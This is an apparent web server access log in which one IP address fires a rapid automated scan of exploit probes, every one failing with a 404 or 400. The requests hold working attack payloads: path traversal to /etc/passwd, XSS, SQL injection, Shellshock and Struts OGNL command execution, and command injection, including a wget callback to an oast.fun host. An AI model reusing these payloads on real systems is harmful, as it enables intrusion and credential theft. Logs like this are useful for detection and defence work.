179.43.161.218 - - [06/Jun/2025:13:33:01 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /vpn/user/download/client?ostype=../../../../../../../../../etc/passwd HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.7.19" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /index.php?module=users/login HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /?pum_action=tools_page_tab_system_info HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Debian; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /wp-content/plugins/sniplets/readme.txt HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.8.22" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /cs/Satellite?pagename=OpenMarket/Gator/FlexibleAssets/AssetMaker/complexassetmaker&cs_imagedir=qqq\x22><script>alert(document.domain)</script> HTTP/1.1" 404 14 "-" "Mozilla/5.0 (SS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET / HTTP/1.1" 404 14 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET / HTTP/1.1" 404 14 "-" "Mozilla/5.0 (CentOS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /wan.htm HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Debian; Linux i686; rv:128.0) Gecko/20100101 Firefox/128.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET / HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Ubuntu; Linux i686; rv:126.0) Gecko/20100101 Firefox/126.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /module/ HTTP/1.1" 404 14 "https://79.137.195.53admin/view:modules/load_module:users" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /axis2/axis2-admin/login HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Knoppix; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET / HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /OA_HTML/lcmServiceController.jsp HTTP/1.1" 404 14 "-" "Mozilla/5.0 (ZZ; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET / HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.release.ReleaseRepMngAction&method=updateDelFlag&TableSelectedID=1%27);WAITFOR+DELAY+%270:0:6%27-- HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.65" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /users/sign_in HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.7.24" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET / HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.20" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET / HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.4.26" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /wp-content/plugins/event-espresso-core-reg/readme.txt HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /wp-content/plugins/wp-mailster/readme.txt HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.18" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /cgi-bin/status HTTP/1.1" 404 14 "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /PolicyMgmt/policyDetailsCard.do?poID=19&typeID=3&prodID=%27%22%3E%3Csvg%2fonload%3dalert(document.domain)%3E HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19041" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /index.php?module=users/login HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET / HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /wp-content/plugins/delightful-downloads/assets/vendor/jqueryFileTree/connectors/jqueryFileTree.php HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.6.21" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /whoAmI/ HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /XMLCHART HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /index.php?module=users/login HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Knoppix; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /context.json HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Teak/4.3.1 Version/17.4.1 Safari/605.1.15" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /wp-content/plugins/category-grid-view-gallery/readme.txt HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14) AppleWebKit/617.12 (KHTML, like Gecko) Version/17.3 Safari/617.12" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /wp-content/plugins/whizz/readme.txt HTTP/1.1" 404 14 "-" "Mozilla/5.0 (ZZ; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /pandora_console/ajax.php?page=include/ajax/update_manager.ajax&upload_file=true HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Ubuntu; Linux i686; rv:128.0) Gecko/20100101 Firefox/128.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /upload/index.php?route=extension/payment/divido/update HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Fedora; Linux i686; rv:120.0) Gecko/20100101 Firefox/120.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /index.php?route=/ HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /users/registration HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1.1 Safari/605.1.15" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /wp-content/plugins/visualizer/readme.txt HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/118.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /costModule/faces/javax.faces.resource./WEB-INF/web.xml.jsf?ln=.. HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /wp-content/plugins/defa-online-image-protector/readme.txt HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0.1 Mobile/15E148 Safari/604.1" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /wp-content/plugins/ajax-random-post/readme.txt HTTP/1.1" 404 14 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /?author=1 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /faces/javax.faces.resource./WEB-INF/web.xml.jsf?ln=.. HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/17.4" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /wp-content/plugins/church-admin/readme.txt HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.18" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /wp-content/plugins/hdw-tube/readme.txt HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.9.25" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=cat%20/etc/passwd HTTP/1.1" 404 14 "-" "Mozilla/5.0 (SS; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /login HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.8.25" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "PUT /_users/org.couchdb.user:poc HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /cgi-bin/mainfunction.cgi/cvmcfgupload?1=2 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.7.18" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /login.php HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.6) AppleWebKit/616.20 (KHTML, like Gecko) Version/17.1.83 Safari/616.20" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /wp-content/plugins/tidio-form/readme.txt HTTP/1.1" 404 14 "-" "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /wp-content/plugins/amty-thumb-recent-post/readme.txt HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /login.php HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.4.22" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /admin/index.php?id=pages HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 12) AppleWebKit/618.6 (KHTML, like Gecko) Version/17.2 Safari/618.6" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /apply_sec.cgi HTTP/1.1" 404 14 "https://79.137.195.53" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.6.22" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /nagiosql/admin/menuaccess.php HTTP/1.1" 404 14 "-" "Mozilla/5.0 (CentOS; Linux i686; rv:121.0) Gecko/20100101 Firefox/121.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET / HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /wp-content/plugins/wp-payeezy-pay/donate.php HTTP/1.1" 404 14 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /wp-content/plugins/forget-about-shortcode-buttons/readme.txt HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /export/classroom-course-statistics?fileNames[]=../../../../../../../etc/passwd HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Kubuntu; Linux i686; rv:126.0) Gecko/20100101 Firefox/126.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /plugins/editors/jckeditor/plugins/jtreelink/dialogs/links.php?extension=menu&view=menu&parent=\x22%20UNION%20SELECT%20NULL,NULL,CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION(),md5(999999999)),NULL,NULL,NULL,NULL,NULL--%20aa HTTP/1.1" 404 14 "https://79.137.195.53" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) LoiLoNote/8.0.0 Version/17.4.1 Safari/605.1.15" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /integration/saveGangster.action HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:70.0) Gecko/20100101 Firefox/70.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /include/exportUser.php?type=3&cla=application&func=_exec&opt=(cat%20/etc/passwd)%3Emsbe.txt HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /service/extdirect HTTP/1.1" 404 14 "-" "Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /soap.cgi?service=whatever-control;curl HTTP/1.1" 404 14 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET / HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /carbon/generic/save_artifact_ajaxprocessor.jsp HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.9.25" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /plugins/servlet/oauth/users/icon-uri?consumerUri=http://d11vrvvlqhfdrjvik8kgcwr95pimmqu8s.oast.fun HTTP/1.1" 404 14 "-" "Mozilla/5.0 (X11; Linux i686; rv:124.0) Gecko/20100101 Firefox/124.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET //css//..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows\x5Cwin.ini HTTP/1.1" 400 157 "-" "-" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /struts2-rest-showcase/orders/3 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /upload HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.8.24" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST / HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /AdminService/urest/v1/LogonResource HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /minio/webrpc HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /cgi-bin/login.cgi HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.4.20" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /upload HTTP/1.1" 404 14 "-" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /mdm/client/v1/mdmLogUploader?udid=si%5C..%5C..%5C..%5Cwebapps%5CDesktopCentral%5C_chart&filename=logger.zip HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.7.15" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /plugins/servlet/gadgets/makeRequest HTTP/1.1" 404 14 "-" "Mozilla/5.0 (X11; Linux i686; rv:126.0) Gecko/20100101 Firefox/126.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 14 "-" "Mozilla/5.0 (CentOS; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /wls-wsat/RegistrationRequesterPortType HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Debian; Linux i686; rv:123.0) Gecko/20100101 Firefox/123.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /xmlpserver/ReportTemplateService.xls HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Knoppix; Linux i686; rv:123.0) Gecko/20100101 Firefox/123.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /RPC2 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (ZZ; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /cgi-bin/mt/mt-xmlrpc.cgi HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /-/jira/login/oauth/access_token HTTP/1.1" 404 14 "-" "-" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /graph_realtime.php?action=init HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /functionRouter HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Knoppix; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0" "-"
159.89.211.52 - admin [07/Jun/2025:08:53:20 +0000] "POST /checkValid HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /cgi-bin/readycloud_control.cgi?1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111/api/users HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Debian; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /AdminTools/querybuilder/logon?framework HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /ui/vropspluginui/rest/services/getvcdetails HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /wp-admin/admin-ajax.php?action=rtec_send_unregister_link HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:71.0) Gecko/20100101 Firefox/71.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /?author=1 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /goform/setSysAdm HTTP/1.1" 404 14 "https://79.137.195.53/login.shtml" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.153183" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /etc/passwd HTTP/1.1" 400 157 "-" "-" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET \x5C..\x5C..\x5C..\x5C..\x5CWindows\x5Cwin.ini HTTP/1.1" 400 157 "-" "-" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "POST /install.php?page=1 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:20 +0000] "GET /backupmgt/localJob.php?session=fail;wget+http://d11vrvvlqhfdrjvik8kgw44tehmrqerwi.oast.fun; HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36" "-"
